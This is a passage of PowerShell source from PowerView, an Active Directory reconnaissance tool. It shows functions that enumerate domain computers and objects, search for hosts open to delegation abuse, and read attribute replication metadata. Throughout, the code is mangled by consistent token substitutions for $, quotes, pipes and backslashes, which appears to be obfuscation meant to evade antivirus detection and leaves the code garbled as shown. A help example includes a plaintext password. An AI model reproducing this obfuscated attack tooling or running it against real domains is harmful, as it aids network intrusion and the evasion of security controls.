        if (RaUPSBoundParameters -and (RaUPSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters RaUPSBoundParameters
        }

        if (RaUCompSearcher) {
            RaUIdentityFilter = q4gUq4gU
            RaUFilter = q4gUq4gU
            RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                if (RaUIdentityInstance -match q4gU^S-1-q4gU) {
                    RaUIdentityFilter += Oj8X(objectsid=RaUIdentityInstance)Oj8X
                }
                elseif (RaUIdentityInstance -match q4gU^CN=q4gU) {
                    RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                    if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                        # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        Write-Verbose Oj8X[Get-DomainComputer] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                        RaUCompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not RaUCompSearcher) {
                            Write-Warning Oj8X[Get-DomainComputer] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                        }
                    }
                }
                elseif (RaUIdentityInstance.Contains(q4gU.q4gU)) {
                    RaUIdentityFilter += Oj8X(wZ5t(name=RaUIdentityInstance)(dnshostname=RaUIdentityInstance))Oj8X
                }
                elseif (RaUIdentityInstance -imatch q4gU^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}RaUq4gU) {
                    RaUGuidByteString = (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object { q4gUScKjq4gU + RaU_.ToString(q4gUX2q4gU) }) -join q4gUq4gU
                    RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                }
                else {
                    RaUIdentityFilter += Oj8X(name=RaUIdentityInstance)Oj8X
                }
            }
            if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
            }

            if (RaUPSBoundParameters[q4gUUnconstrainedq4gU]) {
                Write-Verbose q4gU[Get-DomainComputer] Searching for computers with for unconstrained delegationq4gU
                RaUFilter += q4gU(userAccountControl:1.2.840.113556.1.4.803:=524288)q4gU
            }
            if (RaUPSBoundParameters[q4gUTrustedToAuthq4gU]) {
                Write-Verbose q4gU[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principalsq4gU
                RaUFilter += q4gU(msds-allowedtodelegateto=*)q4gU
            }
            if (RaUPSBoundParameters[q4gUPrintersq4gU]) {
                Write-Verbose q4gU[Get-DomainComputer] Searching for printersq4gU
                RaUFilter += q4gU(objectCategory=printQueue)q4gU
            }
            if (RaUPSBoundParameters[q4gUSPNq4gU]) {
                Write-Verbose Oj8X[Get-DomainComputer] Searching for computers with SPN: RaUSPNOj8X
                RaUFilter += Oj8X(servicePrincipalName=RaUSPN)Oj8X
            }
            if (RaUPSBoundParameters[q4gUOperatingSystemq4gU]) {
                Write-Verbose Oj8X[Get-DomainComputer] Searching for computers with operating system: RaUOperatingSystemOj8X
                RaUFilter += Oj8X(operatingsystem=RaUOperatingSystem)Oj8X
            }
            if (RaUPSBoundParameters[q4gUServicePackq4gU]) {
                Write-Verbose Oj8X[Get-DomainComputer] Searching for computers with service pack: RaUServicePackOj8X
                RaUFilter += Oj8X(operatingsystemservicepack=RaUServicePack)Oj8X
            }
            if (RaUPSBoundParameters[q4gUSiteNameq4gU]) {
                Write-Verbose Oj8X[Get-DomainComputer] Searching for computers with site name: RaUSiteNameOj8X
                RaUFilter += Oj8X(serverreferencebl=RaUSiteName)Oj8X
            }
            if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                Write-Verbose Oj8X[Get-DomainComputer] Using additional LDAP filter: RaULDAPFilterOj8X
                RaUFilter += Oj8XRaULDAPFilterOj8X
            }
            # build the LDAP filter for the dynamic UAC filter value
            RaUUACFilter wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaU_ -match q4gUNOT_.*q4gU) {
                    RaUUACField = RaU_.Substring(4)
                    RaUUACValue = [Int](RaUUACEnum::RaUUACField)
                    RaUFilter += Oj8X(!(userAccountControl:1.2.840.113556.1.4.803:=RaUUACValue))Oj8X
                }
                else {
                    RaUUACValue = [Int](RaUUACEnum::RaU_)
                    RaUFilter += Oj8X(userAccountControl:1.2.840.113556.1.4.803:=RaUUACValue)Oj8X
                }
            }

            RaUCompSearcher.filter = Oj8X(&(samAccountType=805306369)RaUFilter)Oj8X
            Write-Verbose Oj8X[Get-DomainComputer] Get-DomainComputer filter string: RaU(RaUCompSearcher.filter)Oj8X

            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUCompSearcher.FindOne() }
            else { RaUResults = RaUCompSearcher.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUUp = RaUTrue
                if (RaUPSBoundParameters[q4gUPingq4gU]) {
                    RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaU_.properties.dnshostname
                }
                if (RaUUp) {
                    if (RaUPSBoundParameters[q4gURawq4gU]) {
                        # return raw result objects
                        RaUComputer = RaU_
                        RaUComputer.PSObject.TypeNames.Insert(0, q4gUPowerView.Computer.Rawq4gU)
                    }
                    else {
                        RaUComputer = Convert-LDAPProperty -Properties RaU_.Properties
                        RaUComputer.PSObject.TypeNames.Insert(0, q4gUPowerView.Computerq4gU)
                    }
                    RaUComputer
                }
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainComputer] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUCompSearcher.dispose()
        }
    }
}


function Get-DomainObject {
<#
.SYNOPSIS

Return all (or specified) domain objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties samaccountname,usnchanged,...Oj8X. By default, all objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from RaUUACEnum, including
Oj8XNOT_XOj8X negation forms. To see all possible values, run q4gU0wZ5tConvertFrom-UACValue -ShowAllq4gU.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainObject -Domain testlab.local

Return all objects for the testlab.local domain

.EXAMPLE

q4gUS-1-5-21-890171859-3433809279-3366196753-1003q4gU, q4gUCN=dfm,CN=Users,DC=testlab,DC=localq4gU,q4gUb6a9a2fb-bbd5-4f28-9a09-23213cea6693q4gU,q4gUdfm.aq4gU wZ5t Get-DomainObject -Properties distinguishedname

distinguishedname
-----------------
CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local
CN=dfm,CN=Users,DC=testlab,DC=local
OU=OU3,DC=testlab,DC=local
CN=dfm (admin),CN=Users,DC=testlab,DC=local

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainObject -Credential RaUCred -Identity q4gUwindows1q4gU

.EXAMPLE

Get-Domain wZ5t Select-Object -Expand name
testlab.local

q4gUtestlabScKjharmj0yq4gU,q4gUDEVScKjDomain Adminsq4gU wZ5t Get-DomainObject -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain q4gUtestlab.localq4gU from q4gUtestlabScKjharmj0yq4gU
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(samAccountName=harmj0y)))

distinguishedname
-----------------
CN=harmj0y,CN=Users,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain q4gUdev.testlab.localq4gU from q4gUDEVScKjDomain Adminsq4gU
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(samAccountName=Domain Admins)))
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.ADObject

Custom PSObject with translated AD object property fields.

PowerView.ADObject.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ADObjectq4gU)]
    [OutputType(q4gUPowerView.ADObject.Rawq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    DynamicParam {
        RaUUACValueNames = [Enum]::GetNames(RaUUACEnum)
        # add in the negations
        RaUUACValueNames = RaUUACValueNames wZ5t ForEach-Object {RaU_; Oj8XNOT_RaU_Oj8X}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet RaUUACValueNames -Type ([array])
    }

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if (RaUPSBoundParameters -and (RaUPSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters RaUPSBoundParameters
        }
        if (RaUObjectSearcher) {
            RaUIdentityFilter = q4gUq4gU
            RaUFilter = q4gUq4gU
            RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                if (RaUIdentityInstance -match q4gU^S-1-q4gU) {
                    RaUIdentityFilter += Oj8X(objectsid=RaUIdentityInstance)Oj8X
                }
                elseif (RaUIdentityInstance -match q4gU^(CNwZ5tOUwZ5tDC)=q4gU) {
                    RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                    if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                        # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        Write-Verbose Oj8X[Get-DomainObject] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                        RaUObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not RaUObjectSearcher) {
                            Write-Warning Oj8X[Get-DomainObject] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                        }
                    }
                }
                elseif (RaUIdentityInstance -imatch q4gU^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}RaUq4gU) {
                    RaUGuidByteString = (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object { q4gUScKjq4gU + RaU_.ToString(q4gUX2q4gU) }) -join q4gUq4gU
                    RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                }
                elseif (RaUIdentityInstance.Contains(q4gUScKjq4gU)) {
                    RaUConvertedIdentityInstance = RaUIdentityInstance.Replace(q4gUScKj28q4gU, q4gU(q4gU).Replace(q4gUScKj29q4gU, q4gU)q4gU) wZ5t Convert-ADName -OutputType Canonical
                    if (RaUConvertedIdentityInstance) {
                        RaUObjectDomain = RaUConvertedIdentityInstance.SubString(0, RaUConvertedIdentityInstance.IndexOf(q4gU/q4gU))
                        RaUObjectName = RaUIdentityInstance.Split(q4gUScKjq4gU)[1]
                        RaUIdentityFilter += Oj8X(samAccountName=RaUObjectName)Oj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUObjectDomain
                        Write-Verbose Oj8X[Get-DomainObject] Extracted domain q4gURaUObjectDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif (RaUIdentityInstance.Contains(q4gU.q4gU)) {
                    RaUIdentityFilter += Oj8X(wZ5t(samAccountName=RaUIdentityInstance)(name=RaUIdentityInstance)(dnshostname=RaUIdentityInstance))Oj8X
                }
                else {
                    RaUIdentityFilter += Oj8X(wZ5t(samAccountName=RaUIdentityInstance)(name=RaUIdentityInstance)(displayname=RaUIdentityInstance))Oj8X
                }
            }
            if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
            }

            if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                Write-Verbose Oj8X[Get-DomainObject] Using additional LDAP filter: RaULDAPFilterOj8X
                RaUFilter += Oj8XRaULDAPFilterOj8X
            }

            # build the LDAP filter for the dynamic UAC filter value
            RaUUACFilter wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaU_ -match q4gUNOT_.*q4gU) {
                    RaUUACField = RaU_.Substring(4)
                    RaUUACValue = [Int](RaUUACEnum::RaUUACField)
                    RaUFilter += Oj8X(!(userAccountControl:1.2.840.113556.1.4.803:=RaUUACValue))Oj8X
                }
                else {
                    RaUUACValue = [Int](RaUUACEnum::RaU_)
                    RaUFilter += Oj8X(userAccountControl:1.2.840.113556.1.4.803:=RaUUACValue)Oj8X
                }
            }

            if (RaUFilter -and RaUFilter -ne q4gUq4gU) {
                RaUObjectSearcher.filter = Oj8X(&RaUFilter)Oj8X
            }
            Write-Verbose Oj8X[Get-DomainObject] Get-DomainObject filter string: RaU(RaUObjectSearcher.filter)Oj8X

            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUObjectSearcher.FindOne() }
            else { RaUResults = RaUObjectSearcher.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaUPSBoundParameters[q4gURawq4gU]) {
                    # return raw result objects
                    RaUObject = RaU_
                    RaUObject.PSObject.TypeNames.Insert(0, q4gUPowerView.ADObject.Rawq4gU)
                }
                else {
                    RaUObject = Convert-LDAPProperty -Properties RaU_.Properties
                    RaUObject.PSObject.TypeNames.Insert(0, q4gUPowerView.ADObjectq4gU)
                }
                RaUObject
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainObject] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {
<#
.SYNOPSIS

Returns the Active Directory attribute replication metadata for the specified
object, i.e. a parsed version of the msds-replattributemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property q4gUmsds-replattributemetadataq4gU.
This is the domain attribute replication metadata associated with the object. The results are
parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAttributeHistory -Domain testlab.local

Return all attribute replication metadata for all objects in the testlab.local domain.

.EXAMPLE

q4gUS-1-5-21-883232822-274137685-4173207997-1109q4gU,q4gUCN=dfm.a,CN=Users,DC=testlab,DC=localq4gU,q4gUdaq4gU,q4gU94299db1-e3e7-48f9-845b-3bffef8bedbbq4gU wZ5t Get-DomainObjectAttributeHistory -Properties objectClass wZ5t ft

ObjectDN      ObjectGuid    AttributeNam LastOriginat Version      LastOriginat
                            e            ingChange                 ingDsaDN
--------      ----------    ------------ ------------ -------      ------------
CN=dfm.a,C... a6263874-f... objectClass  2017-03-0... 1            CN=NTDS S...
CN=DA,CN=U... 77b56df4-f... objectClass  2017-04-1... 1            CN=NTDS S...
CN=harmj0y... 94299db1-e... objectClass  2017-03-0... 1            CN=NTDS S...

.EXAMPLE

Get-DomainObjectAttributeHistory harmj0y -Properties userAccountControl

ObjectDN              : CN=harmj0y,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94299db1-e3e7-48f9-845b-3bffef8bedbb
AttributeName         : userAccountControl
LastOriginatingChange : 2017-03-07T19:56:27Z
Version               : 4
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ADObjectAttributeHistoryq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gUPropertiesq4gU    =   q4gUmsds-replattributemetadataq4gU,q4gUdistinguishednameq4gU
            q4gURawq4gU           =   RaUTrue
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUSearcherArguments[q4gUFindOneq4gU] = RaUFindOne }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) {
            RaUPropertyFilter = RaUPSBoundParameters[q4gUPropertiesq4gU] -Join q4gUwZ5tq4gU
        }
        else {
            RaUPropertyFilter = q4gUq4gU
        }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUIdentityq4gU]) { RaUSearcherArguments[q4gUIdentityq4gU] = RaUIdentity }

        Get-DomainObject @SearcherArguments wZ5t ForEach-Object {
            RaUObjectDN = RaU_.Properties[q4gUdistinguishednameq4gU][0]
            ForEach(RaUXMLNode in RaU_.Properties[q4gUmsds-replattributemetadataq4gU]) {
                RaUTempObject = [xml]RaUXMLNode wZ5t Select-Object -ExpandProperty q4gUDS_REPL_ATTR_META_DATAq4gU -ErrorAction SilentlyContinue
                if (RaUTempObject) {
                    if (RaUTempObject.pszAttributeName -Match RaUPropertyFilter) {
                        RaUOutput = New-Object PSObject
                        RaUOutput wZ5t Add-Member NoteProperty q4gUObjectDNq4gU RaUObjectDN
                        RaUOutput wZ5t Add-Member NoteProperty q4gUAttributeNameq4gU RaUTempObject.pszAttributeName
                        RaUOutput wZ5t Add-Member NoteProperty q4gULastOriginatingChangeq4gU RaUTempObject.ftimeLastOriginatingChange
                        RaUOutput wZ5t Add-Member NoteProperty q4gUVersionq4gU RaUTempObject.dwVersion
                        RaUOutput wZ5t Add-Member NoteProperty q4gULastOriginatingDsaDNq4gU RaUTempObject.pszLastOriginatingDsaDN
                        RaUOutput.PSObject.TypeNames.Insert(0, q4gUPowerView.ADObjectAttributeHistoryq4gU)
                        RaUOutput
                    }
                }
                else {
                    Write-Verbose Oj8X[Get-DomainObjectAttributeHistory] Error retrieving q4gUmsds-replattributemetadataq4gU for q4gURaUObjectDNq4gUOj8X
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {
<#
.SYNOPSIS

Returns the Active Directory links attribute value replication metadata for the
specified object, i.e. a parsed version of the msds-replvaluemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property q4gUmsds-replvaluemetadataq4gU.
This is the domain linked attribute value replication metadata associated with the object. The
results are parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory wZ5t Group-Object ObjectDN wZ5t ft -a

Count Name
----- ----
    4 CN=Administrators,CN=Builtin,DC=testlab,DC=local
    4 CN=Users,CN=Builtin,DC=testlab,DC=local
    2 CN=Guests,CN=Builtin,DC=testlab,DC=local
    1 CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local
